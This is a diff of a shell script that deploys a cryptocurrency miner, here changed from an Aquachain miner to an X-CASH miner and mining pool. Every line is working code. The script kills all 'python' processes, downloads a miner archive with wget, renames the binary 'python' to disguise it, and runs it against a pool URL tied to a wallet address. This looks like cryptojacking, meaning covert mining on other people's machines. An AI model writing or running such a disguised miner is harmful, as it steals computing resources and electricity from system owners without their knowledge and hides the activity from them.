@@ -15,22 +15,22 @@ if [ -f ${PWD}/python ]; then
 then
 pkill python
 echo " kill process"
-./python -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/lyn
+./python -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/lyn
+./python -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
      
 fi
 exit
 fi
 
-wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
-unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 python
-./python -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/lyn
+wget https://github.com/X-CASH-official/XCASH_ALL_Miner/releases/download/1.0.0/XCASH_ALL_Miner_Linux_1.0.0.zip
+unzip XCASH_ALL_Miner_Linux_1.0.0.zip
+mv XCASH_ALL_Miner python
+./python -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
 exit 0
